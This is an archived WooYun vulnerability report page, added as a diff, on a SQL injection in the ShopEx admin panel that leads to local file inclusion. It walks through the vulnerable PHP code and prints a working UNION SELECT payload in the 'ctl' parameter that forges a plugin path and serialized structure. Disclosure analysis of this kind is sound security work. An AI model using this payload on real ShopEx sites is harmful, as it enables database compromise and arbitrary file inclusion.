@@ -1,0 +1,257 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		shopex注入并导致任意文件包含  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		shopex注入并导致任意文件包含  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Code_Sec">Code_Sec</a> 
+</li><li>提交时间：		2013-06-26 10:16</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-29：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-16：	细节向普通白帽子公开<br/>
+									2013-08-05：	细节向实习白帽子公开<br/>
+									2013-09-24：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">sql注入，无连载</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">shopex后台登陆地址：<br />
+<br />
+http://127.0.0.1/shopadmin/index.php?ctl=passport&amp;act=login<br />
+<br />
+<br />
+<br />
+分析代码：<br />
+<br />
+\core\include_v5\adminCore.php<br />
+<br />
+</p><pre><code>public function adminCore( )<br />
+......<br />
+$mod = $_GET[&#039;ctl&#039;] ? $_GET[&#039;ctl&#039;] : &quot;default&quot;;<br />
+......<br />
+$controller =&amp; $this-&gt;getController( $mod );</code></pre><p class='detail'><br />
+<br />
+$mod就是我们提交的变量ctl<br />
+<br />
+<br />
+<br />
+在下面找到函数getController：<br />
+<br />
+</p><pre><code>public function &amp;getController( $mod, $args = null )<br />
+				{<br />
+								if ( !class_exists( &quot;pageFactory&quot; ) )<br />
+								{<br />
+												require( &quot;pageFactory.php&quot; );<br />
+								}<br />
+								$baseName = basename( $mod, $args );<br />
+								$dirName = dirname( $mod );<br />
+								if ( $dirName == &quot;plugins&quot; )<br />
+								{<br />
+												$addon =&amp; $this-&gt;loadModel( &quot;system/addons&quot; );<br />
+												$object =&amp; $addon-&gt;load( $baseName, &quot;admin&quot; );<br />
+												$object-&gt;db =&amp; $this-&gt;database( );<br />
+								}<br />
+								else<br />
+								{<br />
+												$fname = CORE_DIR.&quot;/admin/controller/&quot;.$dirName.&quot;/ctl.&quot;.$baseName.&quot;.php&quot;;</code></pre><p class='detail'><br />
+<br />
+关键逻辑：<br />
+<br />
+if ( $dirName == &quot;plugins&quot; )<br />
+<br />
+$addon =&amp; $this-&gt;loadModel( &quot;system/addons&quot; );<br />
+<br />
+									$object =&amp; $addon-&gt;load( $baseName, &quot;admin&quot; );<br />
+<br />
+<br />
+<br />
+在文件\core\model_v5\system\mdl.addons.php中：<br />
+<br />
+</p><pre><code>public function &amp;load( $name, $type )<br />
+				{<br />
+								if ( ( $type == &quot;app&quot; || $type == &quot;shop&quot; || $type == &quot;admin&quot; ) &amp;&amp; !class_exists( &quot;app&quot; ) )<br />
+								{<br />
+												require( &quot;app.php&quot; );<br />
+								}<br />
+								$data = $this-&gt;db-&gt;selectrow( &quot;SELECT plugin_id,plugin_path,plugin_struct,plugin_config,plugin_base FROM sdb_plugins WHERE plugin_type=&#039;{$type}&#039; AND plugin_ident=&#039;{$name}&#039;&quot; );<br />
+								return $this-&gt;plugin_instance( $data );<br />
+				}</code></pre><p class='detail'><br />
+<br />
+最终我们提交的变量ctl变成变量：$name，而且shopex已经对变量做过反转义了。这里可以形成sql注入漏洞，继续看plugin_instance( $data )<br />
+<br />
+</p><pre><code>public function plugin_instance( $data )<br />
+				{<br />
+								$sturct = unserialize( $data[&#039;plugin_struct&#039;] );<br />
+								$classname = $sturct[&#039;class_name&#039;];<br />
+								if ( !$classname )<br />
+								{<br />
+												return false;<br />
+								}<br />
+								if ( $data[&#039;plugin_base&#039;] == 0 )<br />
+								{<br />
+												if ( file_exists( PLUGIN_DIR.$data[&#039;plugin_path&#039;] ) )<br />
+												{<br />
+																require_once( PLUGIN_DIR.$data[&#039;plugin_path&#039;] );</code></pre><p class='detail'><br />
+<br />
+require_once( PLUGIN_DIR.$data[&#039;plugin_path&#039;] );，因为存在sql注入漏洞，所以所有的变量$data我们都是可以控制的。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://127.0.0.1/shopadmin/index.php?ctl=plugins/pp.php%27<br />
+<br />
+</p><p class="detail"><a href="../images/2523352387b7c851b71a6a243c9586c8c8abc049.jpg" target="_blank"><img src="../images/2523352387b7c851b71a6a243c9586c8c8abc049.jpg" alt="shopex_1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+本地文件包含./../readme.txt<br />
+<br />
+http://127.0.0.1/shopadmin/index.php?ctl=plugins/pp.php%27%20and%201=2%20union%20select%20plugin_id,0x2E2F2E2E2F726561646D652E747874%20as%20plugin_path,%27s:5:%22funcs%22;a:9:{s:13:%22action_member%22;s:13:%22action_member%22;s:7:%22actions%22;s:7:%22actions%22;s:8:%22changelv%22;s:8:%22changelv%22;s:8:%22addpoint%22;s:8:%22addpoint%22;s:8:%22delpoint%22;s:8:%22delpoint%22;s:10:%22addadvance%22;s:10:%22addadvance%22;s:10:%22deladvance%22;s:10:%22deladvance%22;s:10:%22sendcoupon%22;s:10:%22sendcoupon%22;s:6:%22settag%22;s:6:%22settag%22;}}%27%20as%20plugin_struct,plugin_config,0%20as%20plugin_base%20FROM%20sdb_plugins%20limit%201%23<br />
+<br />
+</p><p class="detail"><a href="../images/252337283e38b765e982b34f3a6e0106f879a31b.jpg" target="_blank"><img src="../images/252337283e38b765e982b34f3a6e0106f879a31b.jpg" alt="shopex_2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤、权限判断等等 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Code_Sec" title="Code_Sec">Code_Sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026912" title="shopex注入并导致任意文件包含">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-06-26 11:42</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26912";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
